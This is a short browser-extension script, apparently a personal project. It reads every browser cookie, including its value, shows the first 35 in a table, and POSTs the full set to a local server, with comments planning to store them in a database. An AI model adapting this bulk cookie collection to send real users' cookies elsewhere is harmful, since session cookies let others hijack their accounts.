
function seeAllTheCookies (callback){
    console.log("getting all the cookies, b/c i love you.")
    chrome.cookies.getAll({}, callback);
}

seeAllTheCookies(function(cookieData) {
    console.log('number of cookies',cookieData.length)
    var allCookieArray = [];
    for (i=0; i<cookieData.length; i++) {
        allCookieArray.push(cookieData[i]);
    }
    localStorage.allCookieArray = allCookieArray
   
    var i=0; while (i<35) {i++
        $('#summary_table').append('<tr><td>'+i+'</td><td>'+
            allCookieArray[i]['domain']+'</td><td>'+
            allCookieArray[i]['name']+'</td><td>'+
            allCookieArray[i]['value']+'</td></tr>')
    }
});


// modify this function to send cookies to the database without server interaction.
// actually, i can send these to the database through the server.  i just need to 
// figure out how to send content from extension to server.

function sendAlltheCookies (callback){
    chrome.cookies.getAll({}, callback);
    console.log("mandar galletas por que me ama.");
}

sendAlltheCookies(function(cookieData){
    console.log('number of cookies',cookieData.length)
    var sendCookieArray = [];
    for (i=0; i<cookieData.length; i++) {
        sendCookieArray.push(cookieData[i]);
    }
    localStorage.sendCookieArray = sendCookieArray
    console.log('array of cookie info is:', sendCookieArray)

    $.ajax({
        type: "POST",
        url: 'http://localhost:5000/load_cookies',
        contentType: 'application/json',
        data: JSON.stringify({
            cookies: sendCookieArray,
            username: 'test'
        }),
        dataType: 'json', 
        success: function (response) {
            console.log(response);
            alert(response); 
        }
    })
});

window.onload=sendAlltheCookies;